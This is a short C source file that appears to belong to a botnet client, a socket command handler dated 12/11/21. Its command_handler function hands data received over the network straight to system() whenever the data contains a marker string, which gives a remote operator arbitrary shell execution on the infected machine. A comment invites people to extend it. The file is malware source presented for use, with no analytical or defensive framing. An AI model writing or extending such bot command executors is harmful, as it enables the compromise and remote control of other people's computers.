#include "../../includes/socket/handler.h"


/*
    *    util/bot/util/socket/handler.c
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


void command_handler(char *buffer) {
    if (strstr(buffer, "123custom_command123") == 0) {
        /* Add more to this if you want! */
    } else {
        system(buffer);
    }
}